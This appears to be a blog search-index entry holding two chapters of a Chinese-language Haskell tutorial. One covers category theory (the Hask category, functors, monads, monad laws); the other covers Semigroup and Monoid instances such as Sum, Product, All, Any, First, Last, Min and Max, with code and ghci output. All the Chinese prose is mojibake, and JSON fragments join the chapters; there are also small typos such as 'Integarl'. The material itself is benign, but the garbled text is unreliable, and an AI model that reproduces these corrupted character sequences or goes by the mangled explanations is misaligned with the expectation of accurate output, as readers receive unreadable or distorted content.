èŒƒç•´åœ¨å¤åˆæ“ä½œä¸‹æ˜¯é—­åˆçš„ï¼ˆclosedï¼‰ï¼š&emsp;&emsp;&emsp;å¦‚æœèŒƒç•´$\\mathbf{C}$ä¸­å­˜åœ¨æ€å°„$f : B\\to C$ã€$g : A\\to B$ï¼Œé‚£ä¹ˆèŒƒç•´$\\mathbf{C}$ä¸­ä¹Ÿä¸€å®šå­˜åœ¨æ€å°„$h : A\\to C$ï¼Œä¸”$h=f\\circ g$ æ¯ä¸ªå¯¹è±¡éƒ½éœ€è¦æœ‰å•ä½æ€å°„ï¼ˆidentity morphismsï¼‰ï¼š&emsp;&emsp;&emsp;å¯¹äºèŒƒç•´$\\mathbf{C}$ä¸­çš„å¯¹è±¡$A$ï¼Œä¸€å®šå­˜åœ¨å•ä½æ€å°„$\\mathrm{id}_A : A\\to A$ï¼Œä¸”å¯¹äºæ¯ä¸ªæ€å°„$g : A\\to B$ï¼Œä¸€å®šæœ‰ï¼š$$g\\circ\\mathrm{id}_A = \\mathrm{id}_B\\circ g = g$$ $\\mathbf{Hask}$èŒƒç•´èŒƒç•´$\\mathbf{Hask}$çš„å¯¹è±¡ä¸ºHaskellä¸­çš„ç±»å‹ï¼ˆtypesï¼‰ï¼Œæ€å°„æ˜¯Haskellä¸­çš„å‡½æ•°ï¼Œå¤åˆè¿ç®—æ˜¯(.)ã€‚å³ä»ç±»å‹Aåˆ°ç±»å‹Bçš„å‡½æ•° f :: A -&gt; B å°±æ˜¯$\\mathbf{Hask}$èŒƒç•´ä¸­çš„ä¸€ä¸ªæ€å°„ã€‚è€Œå‡½æ•° f :: B -&gt; C ã€g :: A -&gt; B çš„ç»„åˆ f . g å°±æ˜¯ä¸€ä¸ªæ–°çš„å‡½æ•° h :: A -&gt; Cã€‚ å¯¹äºä¸‰æ¡å®šå¾‹ï¼š ç¬¬ä¸€æ¡æ˜¾ç„¶æ»¡è¶³ï¼šf . (g . h) = (f . g) . h ç¬¬äºŒæ¡ä¹Ÿæ˜¾ç„¶æ»¡è¶³ï¼Œå¦‚æœæœ‰å‡½æ•° f :: B -&gt; C ã€g :: A -&gt; Bï¼Œä¸€å®šæœ‰å‡½æ•° h = (f . g) :: A -&gt; C å¯¹äºç¬¬ä¸‰æ¡å®šå¾‹ï¼ŒHaskellä¸­å­˜åœ¨å•ä½å‡½æ•° id ï¼Œä½†idæ˜¯å¤šæ€ï¼ˆpolymorphicï¼‰çš„ï¼Œè¦ä¸ºå…¶æŒ‡å®šç±»å‹ä½¿å…¶å˜æˆå•æ€ï¼ˆmonomorphicï¼‰çš„ã€‚æ¯”å¦‚æ€å°„$\\mathrm{id}_A$åœ¨Haskellä¸­å°±å¯ä»¥è¡¨ç¤ºä¸º id :: A -&gt; Aã€‚å¹¶ä¸”æ˜¾ç„¶æ»¡è¶³ç¬¬ä¸‰æ¡å®šå¾‹ï¼ˆå…¶ä¸­ f :: A -&gt; Bï¼‰ï¼š(id :: B -> B) . f = f . (id :: A -> A) = f å‡½å­ï¼ˆFunctorsï¼‰ä¸€ä¸ªèŒƒç•´ä¸­çš„æ€å°„å°†ä¸¤ä¸ªå¯¹è±¡è”ç³»èµ·æ¥ï¼Œè€Œå‡½å­åˆ™ä¼šå°†ä¸¤ä¸ªèŒƒç•´è”ç³»èµ·æ¥ã€‚æ¢å¥è¯è¯´ï¼Œå‡½å­å°±æ˜¯ä»ä¸€ä¸ªèŒƒç•´åˆ°å¦ä¸€ä¸ªèŒƒç•´çš„å˜æ¢ã€‚æ¯”å¦‚å¯¹äºèŒƒç•´$\\mathbf{C}$ã€$\\mathbf{D}$ï¼Œå®šä¹‰å‡½å­$F : \\mathbf{C}\\to\\mathbf{D}$æ»¡è¶³ï¼š å¯¹äº$\\mathbf{C}$ä¸­çš„ä»»æ„å¯¹è±¡$A$ï¼Œåœ¨$\\mathbf{D}$ä¸­éƒ½æœ‰å¯¹è±¡$F(A)$ å¯¹äº$\\mathbf{C}$ä¸­çš„ä»»æ„æ€å°„$f : A\\to B$ï¼Œåœ¨$\\mathbf{D}$ä¸­éƒ½æœ‰æ€å°„$F(f) : F(A)\\to F(B)$ æ¯”å¦‚ï¼š &emsp;é—å¿˜å‡½å­ï¼ˆforgetful functorï¼‰$U : \\mathbf{Grp}\\to\\mathbf{Set}$ï¼Œå°†ä¸€ä¸ªç¾¤æ˜ å°„åˆ°ä¸€ä¸ªé›†åˆä¸­ï¼Œå°†ç¾¤åŒæ€æ˜ å°„åˆ°é›†åˆé—´çš„å‡½æ•° &emsp;å¹‚é›†å‡½å­ï¼ˆpower set functorï¼‰$P : \\mathbf{Set}\\to\\mathbf{Set}$ï¼Œå°†ä¸€ä¸ªé›†åˆæ˜ å°„åˆ°å®ƒçš„å¹‚é›†ï¼Œå°†åŸé›†åˆä¸­çš„å‡½æ•°$f : A\\to B$æ˜ å°„åˆ°å‡½æ•°$P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)$ï¼Œå³ä»$U\\subseteq A$åˆ°å€¼åŸŸ$f(U)\\subseteq B$çš„æ˜ å°„ &emsp;è‡ªå‡½å­ï¼ˆendofunctorï¼‰$1_{\\mathbf{C}} : \\mathbf{C}\\to\\mathbf{C}$ï¼Œå°†ä¸€ä¸ªèŒƒç•´æ˜ å°„åˆ°å®ƒæœ¬èº« å‡½å­å…¬ç†å‡½å­$F : \\mathbf{C}\\to\\mathbf{D}$ä¹Ÿéœ€è¦æ»¡è¶³ä¸¤ä¸ªå…¬ç†ï¼š å¯¹äºä»»æ„å¯¹è±¡$X\\in\\mathbf{C}$ï¼Œæ’æœ‰$F(\\mathrm{id}_X)=\\mathrm{id}_{F(X)}$ å¯¹äºæ€å°„$f : Y\\to Z$ã€$g : X\\to Y$ï¼Œæ’æœ‰$F(f\\circ g) = F(f)\\circ F(g)$ $\\mathbf{Hask}$èŒƒç•´ä¸Šçš„å‡½å­Haskellä¸­çš„Functorå®šä¹‰æ˜¯ï¼š 12class Functor (f :: * -&gt; *) where fmap :: (a -&gt; b) -&gt; f a -&gt; f b å¯¹äºHaskellä¸­çš„Functorï¼Œå®ƒå®é™…ä¸Šæ˜¯ä»$\\mathbf{Hask}$èŒƒç•´ï¼ˆtypesï¼‰åˆ°å®ƒå­èŒƒç•´çš„å˜æ¢ã€‚æ¯”å¦‚åˆ—è¡¨å‡½å­$\\mathtt{[]} : \\mathbf{Hask}\\to\\mathbf{Lst}$ï¼ˆå…¶ä¸­$\\mathbf{Lst}$æ˜¯æ‰€æœ‰Haskellä¸­åˆ—è¡¨ç±»å‹æ„æˆçš„èŒƒç•´ï¼‰ å®ƒä¹Ÿè¾¾æˆäº†èŒƒç•´è®ºä¸­å¯¹äºå‡½å­çš„è¦æ±‚ã€‚å‡½å­éœ€è¦è¿›è¡Œä¸¤ä¸ªæ“ä½œï¼šå°†ä¸€ä¸ªèŒƒç•´ä¸­çš„å¯¹è±¡æ˜ å°„åˆ°å¦ä¸€ä¸ªèŒƒç•´ä¸­ã€å°†ä¸€ä¸ªèŒƒç•´ä¸­çš„æ€å°„æ˜ å°„åˆ°å¦ä¸€ä¸ªèŒƒç•´ä¸­ã€‚ä»¥Maybeä¸ºä¾‹ï¼Œå®ƒå®ç°äº†å‡½å­çš„è¦æ±‚ï¼š Maybeæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œä»–å¯ä»¥å°†ä»»æ„ç±»å‹ T å˜æˆæ–°ç±»å‹ Maybe Tï¼Œç›¸å½“äºä»$\\mathbf{Hask}$èŒƒç•´çš„å¯¹è±¡å˜æˆäº†$\\mathbf{Maybe}$èŒƒç•´çš„å¯¹è±¡ fmapå‡½æ•°æ¥æ”¶ä¸€ä¸ª a -&gt; b ç±»å‹çš„å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ª Maybe a -&gt; Maybe b ç±»å‹çš„å‡½æ•°ï¼Œç›¸å½“äºå°†$\\mathbf{Hask}$èŒƒç•´ä¸­çš„æ€å°„$f : A\\to B$æ˜ å°„æˆäº†$\\mathbf{Maybe}$èŒƒç•´ä¸­çš„æ€å°„$\\mathbf{Maybe}(f) : \\mathbf{Maybe}(A)\\to\\mathbf{Maybe}(B)$ æ³¨æ„ï¼šæ—¶åˆ»è®°ä½è¿™é‡Œç ”ç©¶çš„æ˜¯$\\mathbf{Hask}$èŒƒç•´å’Œå®ƒçš„å­èŒƒç•´ï¼Œå¯¹è±¡æ˜¯ç±»å‹è€Œä¸æ˜¯å€¼ï¼Œæ€å°„æ˜¯å‡½æ•°ä¹ŸæŒ‡çš„æ˜¯ä»ç±»å‹åˆ°ç±»å‹ åŒæ—¶ï¼ŒHaskellä¸­çš„Functorä¹Ÿæ»¡è¶³å‡½å­å…¬ç†ï¼š fmap id = id å³ fmap (id :: A -&gt; A) = (id :: f A -&gt; f A) fmap (f . g) = fmap f . fmap g å•å­ï¼ˆMonadsï¼‰ ä¸€ä¸ªå•å­è¯´ç™½äº†ä¸è¿‡å°±æ˜¯è‡ªå‡½å­èŒƒç•´ä¸Šçš„ä¸€ä¸ªå¹ºåŠç¾¤è€Œå·² _(:Ğ·ã€âˆ )_ è‡ªå‡½å­åœ¨å‰é¢è¯´åˆ°è¿‡æ˜¯ä»ä¸€ä¸ªèŒƒç•´åˆ°è‡ªèº«çš„ä¸€ä¸ªå‡½å­ï¼Œå¦‚èŒƒç•´$\\mathbf{C}$ä¸Šçš„è‡ªå‡½å­æ˜¯$F : \\mathbf{C}\\to\\mathbf{C}$ã€‚è‡ªå‡½å­èŒƒç•´å°±æ˜¯å¯¹è±¡éƒ½æ˜¯è‡ªå‡½å­çš„èŒƒç•´ã€‚å¹ºåŠç¾¤å’ŒHaskellä¸­å­¦åˆ°çš„Monoidç±»å‹ç±»ä¸€æ ·ï¼Œæ˜¯ä¸€ä¸ªæœ‰å¯ç»“åˆäºŒå…ƒè¿ç®—å’Œå•ä½å…ƒçš„ä»£æ•°ç»“æ„ã€‚å› æ­¤å•å­å°±æ˜¯ä¸€ä¸ªè‡ªå‡½å­ï¼Œè€Œä¸”å®ƒæœ‰å¯ç»“åˆäºŒå…ƒè¿ç®—ï¼ˆHaskellä¸­&gt;=&gt;ï¼‰å’Œå•ä½å…ƒï¼ˆHaskellä¸­returnï¼‰ã€‚ ä¸€ä¸ªå•å­$M : \\mathbf{C}\\to\\mathbf{C}$è¿˜åŒ…å«ä¸¤ä¸ªæ€å°„ï¼ˆå¯¹äºèŒƒç•´$\\mathbf{C}$ä¸­çš„æ‰€æœ‰å¯¹è±¡$X$ï¼‰ï¼š $\\mathrm{unit}_X^M : X\\to M(X)$ $\\mathrm{join}_X^M : M(M(X))\\to M(X)$ ï¼ˆå½“å¼å­ä¸­çš„å•å­æ˜æ˜¾æ˜¯$M$æ—¶ï¼Œå¯ä»¥çœç•¥ä¸Šæ ‡${}^M$ï¼‰ Haskellä¸­Monadçš„å®šä¹‰æ˜¯ï¼š 123class Functor m =&gt; Monad m where return :: a -&gt; m a (&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b å…¶ä¸­å¾ˆæ˜¾ç„¶å¤šæ€å‡½æ•°returnå¯¹åº”äº†å®šä¹‰ä¸­çš„$\\mathrm{unit}$ï¼Œä½†æ˜¯&gt;&gt;=å’Œ$mathrm{join}$çš„å¯¹åº”å…³ç³»å¹¶ä¸æ˜æ˜¾ã€‚å› æ­¤Haskellä¸­æœ‰ä¸€ä¸ªå·¥å…·å‡½æ•°joinï¼Œå®ƒçš„æ•ˆæœå°±æ˜¯å®šä¹‰ä¸­çš„$\\mathrm{join}$ï¼Œè€Œä¸”å®ƒå¯ä»¥å’Œ&gt;&gt;=äº’ç›¸å®šä¹‰ï¼š 12345join :: Monad m =&gt; m (m a) -&gt; m ajoin x = x &gt;&gt;= id(&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b x &gt;&gt;= f = join $ fmap f x æ‰€ä»¥Haskellä¸­ä¸ºMonadè¦æ±‚å®šä¹‰&gt;&gt;=å°±ç›¸å½“äºå®šä¹‰äº†$\\mathrm{join}$ ä¾‹å¦‚ï¼Œå¹‚é›†å‡½å­$P : \\mathbf{Set}\\to\\mathbf{Set}$ä¹Ÿæ˜¯ä¸€ä¸ªå•å­ï¼Œå¯ä»¥ä¸ºå®ƒå®šä¹‰$\\mathrm{unit}$å’Œ$\\mathrm{join}$ä¸¤ä¸ªæ€å°„ã€‚Haskellä¸­çš„åˆ—è¡¨ä¹Ÿå¯ä»¥è¿‘ä¼¼çœ‹ä½œå¹‚é›†å‡½å­ã€‚ &emsp;æ€å°„/å‡½æ•°çš„ç±»å‹ï¼š å¹‚é›†å‡½å­ Haskellä¸­åˆ—è¡¨ ä¸€ä¸ªé›†åˆ$S$å’Œä¸€ä¸ªæ€å°„$f : A\\to B$ ä¸€ä¸ªç±»å‹ T å’Œä¸€ä¸ªå‡½æ•° f :: A -&gt; B $P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)$ fmap f :: [A] -&gt; [B] $\\mathrm{unit}_S : S\\to\\mathcal{P}(S)$ return :: T -&gt; [T] $\\mathrm{join}_S : \\mathcal{P}(\\mathcal{P}(S))\\to\\mathcal{P}(S)$ join :: [[T]] -&gt; [T] &emsp;æ€å°„/å‡½æ•°çš„å®šä¹‰ï¼š å¹‚é›†å‡½å­ Haskellä¸­åˆ—è¡¨ $(\\mathcal{P}(f))(S) = \\{f(a):a\\in S\\}$ fmap f xs = [ f a | a &lt;- xs ] $\\mathrm{unit}_S(x) = \\{x\\}$ return x = [x] $\\mathrm{join}_S(L) = \\bigcup L$ join xs = concat xs å•å­å…¬ç†ç»™å®šä¸€ä¸ªå•å­$M : \\mathbf{C}\\to\\mathbf{C}$ï¼Œå’Œä¸€ä¸ªæ€å°„$f : A\\to B$ï¼ˆå…¶ä¸­$A,B\\in \\mathbf{C}$ï¼‰ï¼Œé‚£ä¹ˆæ»¡è¶³ä¸‹é¢å››æ¡å®šå¾‹ï¼š $\\mathrm{join}\\circ M(\\mathrm{join})=\\mathrm{join}\\circ\\mathrm{join}$ $\\mathrm{join}\\circ M(\\mathrm{unit})=\\mathrm{join}\\circ\\mathrm{unit}=\\mathrm{id}$ $\\mathrm{unit}\\circ f = M(f)\\circ\\mathrm{unit}$ $\\mathrm{join}\\circ M(M(f)) = M(f)\\circ\\mathrm{join}$ ä¹Ÿå¯ä»¥å¾ˆè‡ªç„¶åœ°å°†å…¶è½¬åŒ–ä¸ºHaskellä¸­çš„è¡¨è¿°ï¼š join . fmap join = join . join join . fmap return = join . return = id return . f = fmap f . return join . fmap (fmap f) = fmap f . join åœ¨Haskellä¸­ï¼Œä½¿ç”¨&gt;&gt;=ä¹Ÿæœ‰ä¸‰ä¸ªå®šå¾‹å’Œè¿™å››ä¸ªå®šå¾‹æ˜¯ç­‰ä»·çš„ï¼š return x &gt;&gt;= f = f x 123456 return x &gt;&gt;= f = join (fmap f (return x)) = join (fmap f . return $ x)= join (return (f x)) = join (return . f $ x)= join . return $ (f x)= id (f x)= f x m &gt;&gt;= return = m1234 m &gt;&gt;= return = join (fmap return m) = join . fmap return $ m = id m= m (m &gt;&gt;= f) &gt;&gt;= g = m &gt;&gt;= (\\x -&gt; f x &gt;&gt;= g)123456789101112 (m &gt;&gt;= f) &gt;&gt;= g = (join (fmap f m)) &gt;&gt;= g = join (fmap g (join (fmap f m)))= join . fmap g . join $ fmap f m = join . join . fmap (fmap g) $ fmap f m = join . join . fmap (fmap g) . fmap f $ m = join . join . fmap (fmap g . f) $ m = join . fmap join . fmap (fmap g . f) $ m = join . fmap (join . (fmap g . f)) $ m = join . fmap (\\x -&gt; join (fmap g (f x))) $ m = join . fmap (\\x -&gt; f x &gt;&gt;= g) $ m = join (fmap (\\x -&gt; f x &gt;&gt;= g) m)= m &gt;&gt;= (\\x -&gt; f x &gt;&gt;= g) ï¼ˆèŒƒç•´è®ºå°±å…ˆç®€å•çœ‹è¿™äº›ï¼Œåªæ˜¯ä¸ºäº†æ›´å¥½ç†è§£Haskellä¸­æ¦‚å¿µè€Œå·²ï¼‰ Reference Haskell/Category theory - wikibooks Category theory - wikipedia èŒƒç•´è®º - ç»´åŸºç™¾ç§‘ Monad (category theory) - wikipedia Functor - wikipedia ç›®å½• #0&nbsp;|&nbsp;æ€»ç« &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#1&nbsp;|&nbsp;åŸºç¡€è¯­æ³•ä¸å‡½æ•°&emsp;&emsp;&emsp;#2&nbsp;|&nbsp;é«˜é˜¶å‡½æ•°ä¸æ¨¡å—&emsp;&emsp;&emsp;#3&nbsp;|&nbsp;ç±»å‹ä¸ç±»å‹ç±»&emsp;&emsp;&emsp;&emsp;#4&nbsp;|&nbsp;è¾“å…¥è¾“å‡ºä¸æ–‡ä»¶&emsp;&emsp;&emsp;#5&nbsp;|&nbsp;å‡½å­ã€åº”ç”¨å‡½å­ä¸å•å­#6&nbsp;|&nbsp;åŠç¾¤ä¸å¹ºåŠç¾¤&emsp;&emsp;&emsp;&emsp;#7&nbsp;|&nbsp;ä¸€äº›å…¶å®ƒç±»å‹ç±»&emsp;&emsp;&emsp;#A&nbsp;|&nbsp;Haskellä¸èŒƒç•´è®º&emsp;&nbsp;&thinsp;","link":"/p/96c32eae.html"},{"title":"ã€ŒLearn Haskellã€#6 åŠç¾¤ä¸å¹ºåŠç¾¤","text":"&lt; #5 #7 &gt; SemigroupåŠç¾¤ï¼ˆsemigroupï¼‰æ˜¯ä¸€ä¸ªé›†åˆ$S$ï¼Œå®ƒéœ€è¦æŒ‡å®šä¸€ä¸ªäºŒå…ƒè¿ç®—ç¬¦$\\oplus$ï¼Œå¹¶ä¸”æ»¡è¶³ $$a\\oplus b \\in S\\quad a, b\\in S$$ ä»¥åŠç»“åˆï¼ˆassociativeï¼‰å¾‹ï¼š $$(a\\oplus b)\\oplus c = a\\oplus (b\\oplus c)$$ è¿™ä¸ªäºŒå…ƒè¿ç®—ç¬¦åœ¨Haskellçš„Semigroupä¸­è¢«å®šä¹‰ä¸º&lt;&gt;å‡½æ•°ï¼š 12345678910class Semigroup a where (&lt;&gt;) :: a -&gt; a -&gt; a sconcat :: NonEmpty a -&gt; a sconcat (a :| as) = go a as where go b (c:cs) = b &lt;&gt; go c cs go b [] = b stimes :: Integarl b =&gt; b -&gt; a -&gt; a stimes = ... é™¤æ­¤ä¹‹å¤–è¿˜æœ‰sconcatå’Œstimeså‡½æ•°ï¼Œéƒ½ç»™å‡ºäº†é»˜è®¤å®ç°ã€‚å¯¹äºåˆ—è¡¨ï¼Œ&lt;&gt;ç›¸å½“äº(++)ï¼Œstimesç›¸å½“äºconcat . replicateï¼š 123456ghci&gt; [1, 2] &lt;&gt; [3, 4][1,2,3,4]ghci&gt; sconcat $ fromList [[1, 2], [3, 4]][1,2,3,4]ghci&gt; stimes 3 [1, 2][1,2,1,2,1,2] Semigroup Law (x &lt;&gt; y) &lt;&gt; z = x &lt;&gt; (y &lt;&gt; z) è¡¥ï¼šNonEmptyNonEmptyè¡¨ç¤ºéç©ºåˆ—è¡¨ï¼Œå®šä¹‰æ˜¯ï¼š 1data NonEmpty a = a :| [a] deriving (Eq, Ord) ä½¿ç”¨ä¸€ä¸ªå…ƒç´ å’Œä¸€ä¸ªåˆ—è¡¨ç”¨:|è¿æ¥å°±å¯ä»¥ç”Ÿæˆä¸€ä¸ªNonEmptyç±»å‹çš„åˆ—è¡¨ Data.List.NonEmptyæ¨¡å—ä¸­å®ç°äº†å¾ˆå¤šæ™®é€šåˆ—è¡¨æœ‰çš„å‡½æ•°ï¼Œéœ€è¦qualified importåè°ƒç”¨ï¼Œä½¿ç”¨fromListã€toListå‡½æ•°å¯ä»¥åœ¨æ™®é€šåˆ—è¡¨å’Œéç©ºåˆ—è¡¨ä¹‹é—´è½¬æ¢ 12345678ghci&gt; import qualified Data.List.NonEmpty as NEghci&gt; arr = NE.fromList [1, 2, 3]ghci&gt; arr1 :| [2,3]ghci&gt; NE.head arr 1ghci&gt; NE.tail arr [2,3] Monoidå¹ºåŠç¾¤ï¼ˆMonoidï¼‰æ˜¯ä¸€ä¸ªæœ‰å•ä½å…ƒç´ $e$çš„åŠç¾¤ï¼Œå³$e$æ»¡è¶³ï¼š $$e\\oplus x = x\\oplus e = x$$ 12345678class Semigroup a =&gt; Monoid a where mempty :: a mappend :: a -&gt; a -&gt; a mappend = (&lt;&gt;) mconcat :: [a] -&gt; a mconcat = foldr mappend mempty å¯ä»¥çœ‹å‡ºMonoidè¦æ±‚äº†ä¸‰ä¸ªå‡½æ•°ï¼Œå…¶ä¸­æœ€å°‘åªéœ€è¦memptyï¼Œå®ƒç›´æ¥è¿”å›ä¸€ä¸ªå€¼ï¼Œè¡¨ç¤ºå•ä½å…ƒç´ ã€‚mappendå³Semigroupä¸­çš„&lt;&gt;è¿ç®—ç¬¦ï¼Œmconcatä¹Ÿæä¾›äº†é»˜è®¤å®ç° å®ä¾‹[a]å› ä¸ºMonoidçš„å®ä¾‹æ˜¯ä¸€ä¸ªå…·ä½“ç±»å‹ï¼Œè€Œä¸æ˜¯åƒFunctorç­‰ä¸€æ ·ç­‰ç±»å‹æ„é€ å™¨ï¼Œæ‰€ä»¥[]å¹¶ä¸æ˜¯Monoidçš„å®ä¾‹ï¼Œä½†æ˜¯å…·ä½“ç±»å‹[a]æ˜¯ä¸€ä¸ªå¹ºåŠç¾¤ï¼š 123456instance Semigroup [a] where (&lt;&gt;) = (++)instance Monoid [a] where mempty = [] mconcat xss = [x | xs &lt;- xss, x &lt;- xs] åˆ—è¡¨çš„å•ä½å…ƒç´ (mempty)å°±æ˜¯ç©ºåˆ—è¡¨[]ï¼Œè¿ç®—ç¬¦å°±æ˜¯åˆå¹¶åˆ—è¡¨(++)ï¼Œmconcatä¹Ÿç”¨åˆ—è¡¨æ¨å¯¼é‡æ–°å®ç°æé«˜æ•ˆç‡ 12345678ghci&gt; mempty :: [Int] []ghci&gt; [1, 2] &lt;&gt; [3, 4][1,2,3,4]ghci&gt; [1, 2] `mappend` [3, 4][1,2,3,4]ghci&gt; mconcat [[1,2], [3,4]][1,2,3,4] Ordering1234567instance Semigroup Ordering where LT &lt;&gt; _ = LT EQ &lt;&gt; y = y GT &lt;&gt; _ = GTinstance Monoid Ordering where mempty = EQ ä¸»è¦å¯ä»¥ç”¨äºæ¯”è¾ƒå­—å…¸åºï¼š 12ghci&gt; mconcat (zipWith compare &quot;abcd&quot; &quot;acbd&quot;)LT Sum &amp; Productå¯¹äºæ•°å­—ï¼ŒåŠ æ³•å’Œä¹˜æ³•éƒ½æ»¡è¶³ç»“åˆå¾‹ï¼Œæ‰€ä»¥å¯¹äºNumï¼Œæœ‰ä¸¤ç§å®ç°Monoidçš„æ–¹å¼ï¼Œä½†æ˜¯ä¸èƒ½ä¸ºåŒä¸€ç±»å‹è®¾ç½®ä¸¤ç§å®ä¾‹æ–¹å¼ï¼Œæ‰€ä»¥Data.Monoidä¸­æä¾›äº†ä¸¤ä¸ªåŒ…è£…å™¨â€”â€”â€”â€”Sumå’ŒProductï¼š 12newtype Sum a = Sum {getSum :: a} deriving (...)newtype Product a = Product {getProduct :: a} deriving (...) å®ƒä»¬ä½¿ç”¨Sumæˆ–Productæ¥åŒ…è£…èµ·ä¸€ä¸ªæ•°å­—ï¼Œå¯ä»¥é€šè¿‡getSumæˆ–getProductæ¥è·å–å…¶ä¸­çš„å€¼ å¯¹äºåŠ æ³•ï¼ŒäºŒå…ƒæ“ä½œä¸º(+)ï¼Œå•ä½å…ƒç´ ä¸º0ï¼›å¯¹äºä¹˜æ³•ï¼ŒäºŒå…ƒæ“ä½œä¸º(*)ï¼Œå•ä½å…ƒç´ ä¸º1: 1234567891011instance Num a =&gt; Semigroup (Sum a) where (&lt;&gt;) = coerce ((+) :: a -&gt; a -&gt; a)instance Num a =&gt; Monoid (Sum a) where mempty = Sum 0instance Num a =&gt; Semigroup (Product a) where (&lt;&gt;) = coerce ((*) :: a -&gt; a -&gt; a)instance Num a =&gt; Monoid (Product a) where mempty = Product 1 12345678ghci&gt; Sum 5 &lt;&gt; Sum 6 &lt;&gt; Sum 10Sum {getSum = 21}ghci&gt; getSum . mconcat . fmap Sum $ [5, 6, 10]21ghci&gt; Product 5 &lt;&gt; Product 6 &lt;&gt; Product 10Product {getProduct = 300}ghci&gt; getProduct . mconcat . fmap Product $ [5, 6, 10]300 All &amp; Anyå’Œæ•°å­—ä¸€æ ·ï¼Œå¸ƒå°”å€¼ä¹Ÿæœ‰ä¸¤ç§å®ç°Monoidçš„æ–¹å¼ï¼Œå› æ­¤Data.Monoidæ¨¡å—ä¸­ä¹Ÿæä¾›äº†ä¸¤ä¸ªåŒ…è£…å™¨ï¼Œåˆ†åˆ«å®ç°äº†è¿™ä¸¤ç§Monoidï¼š 12345678910111213141516newtype All = All { getAll :: Bool } deriving (...)instance Semigroup All where (&lt;&gt;) = coerce (&amp;&amp;)instance Monoid All where mempty = All Truenewtype Any = Any { getAny :: Bool } deriving (...)instance Semigroup Any where (&lt;&gt;) = coerce (||)instance Monoid Any where mempty = Any False 12345678ghci&gt; getAll (All True &lt;&gt; mempty &lt;&gt; All False)Falseghci&gt; getAll (mconcat (map (\\x -&gt; All (even x)) [2,4,6,7,8]))Falseghci&gt; getAny (Any True &lt;&gt; mempty &lt;&gt; Any False)Trueghci&gt; getAny (mconcat (map (\\x -&gt; Any (even x)) [2,4,6,7,8]))True Monoid a =&gt; Maybe aå¦‚æœaæ˜¯ä¸€ä¸ª(å¹º)åŠç¾¤ï¼Œé‚£ä¹ˆMaybe aä¹Ÿæ˜¯ä¸€ä¸ªå¹ºåŠç¾¤ï¼Œå•ä½å…ƒå°±æ˜¯Nothingï¼š 1234567instance Semigroup a =&gt; Semigroup (Maybe a) where Nothing &lt;&gt; b = b a &lt;&gt; Nothing = a Just a &lt;&gt; Just b = Just (a &lt;&gt; b)instance Semigroup a =&gt; Monoid (Maybe a) where mempty = Nothing 123456ghci&gt; Nothing &lt;&gt; Just &quot;andy&quot;Just &quot;andy&quot;ghci&gt; Just LT &lt;&gt; NothingJust LTghci&gt; Just (Sum 3) &lt;&gt; Just (Sum 4) Just (Sum {getSum = 7}) First &amp; Lastå¯¹äºMaybeä¹Ÿæœ‰ä¸¤ç§å®ç°Monoidçš„æ–¹æ³•ï¼Œå³&lt;&gt;æ“ä½œæ¯æ¬¡æ’å–å·¦è¾¹å’Œæ¯æ¬¡æ’å–å³è¾¹ï¼ˆåœ¨æ²¡æœ‰Nothingçš„æƒ…å†µä¸‹ï¼‰ï¼Œæ‰€ä»¥Data.Monoidæ¨¡å—ä¸­ä¹Ÿæä¾›äº†ä¸¤ä¸ªæ–°çš„åŒ…è£…å™¨ï¼šFirstå’ŒLastï¼š 123456789101112131415161718newtype First a = First { getFirst :: Maybe a } deriving (...)instance Semigroup (First a) where First Nothing &lt;&gt; b = b a &lt;&gt; _ = ainstance Monoid (First a) where mempty = First Nothingnewtype Last a = Last { getLast :: Maybe a } deriving (...)instance Semigroup (Last a) where a &lt;&gt; Last Nothing = a _ &lt;&gt; b = binstance Monoid (Last a) where mempty = Last Nothing 12345678ghci&gt; getFirst (First (Just &quot;hello&quot;) &lt;&gt; First Nothing &lt;&gt; First (Just &quot;world&quot;))Just &quot;hello&quot;ghci&gt; getLast (Last (Just &quot;hello&quot;) &lt;&gt; Last Nothing &lt;&gt; Last (Just &quot;world&quot;))Just &quot;world&quot;ghci&gt; getFirst . mconcat . map First $ [Nothing, Just 9, Just 10] Just 9ghci&gt; getLast . mconcat . map Last $ [Nothing, Just 9, Just 10] Just 10 Min &amp; Maxå¯¹äºæœ‰ç•Œçš„ç±»å‹ï¼Œä¹Ÿæœ‰ä¸¤ç§å®ç°Monoidçš„æ–¹å¼ï¼Œæ¯æ¬¡äºŒå…ƒæ“ä½œéƒ½å–æœ€å°æˆ–æœ€å¤§ã€‚Data.Semigroupæ¨¡å—ä¸­æä¾›äº†ä¸¤ä¸ªåŒ…è£…å…¶å™¨ï¼šMinå’ŒMaxï¼š 12345678910111213141516newtype Min a = Min { getMin :: a } deriving (...)instance Ord a =&gt; Semigroup (Min a) where (&lt;&gt;) = coerce (min :: a -&gt; a -&gt; a)instance (Ord a, Bounded a) =&gt; Monoid (Min a) where mempty = maxBoundnewtype Max a = Max { getMax :: a } deriving (...)instance Ord a =&gt; Semigroup (Max a) where (&lt;&gt;) = coerce (max :: a -&gt; a -&gt; a)instance (Ord a, Bounded a) =&gt; Monoid (Max a) where mempty = minBound 12345678ghci&gt; Min 3 &lt;&gt; Min 5Min {getMin = 3}ghci&gt; Max 3 &lt;&gt; Max 5Max {getMax = 5}ghci&gt; getMin . mconcat . map Min $ [1,2,3] :: Int1ghci&gt; getMax . mconcat . map Max $ [1,2,3] :: Int3 å…ƒç»„å½“å…ƒç»„å†…çš„æ‰€æœ‰å…ƒç´ éƒ½æ˜¯å¹ºåŠç¾¤æ—¶ï¼Œæ•´ä¸ªå…ƒç»„ä¹Ÿæ˜¯ä¸€ä¸ªå¹ºåŠç¾¤ï¼š 123456instance (Semigroup a, Semigroup b) =&gt; Semigroup (a, b) where (a,b) &lt;&gt; (a',b') = (a&lt;&gt;a',b&lt;&gt;b') stimes n (a,b) = (stimes n a, stimes n b)instance (Monoid a, Monoid b) =&gt; Monoid (a,b) where mempty = (mempty, mempty) 12ghci&gt; mconcat $ map (\\x -&gt; (Min x, Max x)) [1..10] :: (Min Int, Max Int)(Min {getMin = 1},Max {getMax = 10}) Monoid Laws mempty &lt;&gt; x = x x &lt;&gt; mempty = x (x &lt;&gt; y) &lt;&gt; z = x &lt;&gt; (y &lt;&gt; z) Monoidal 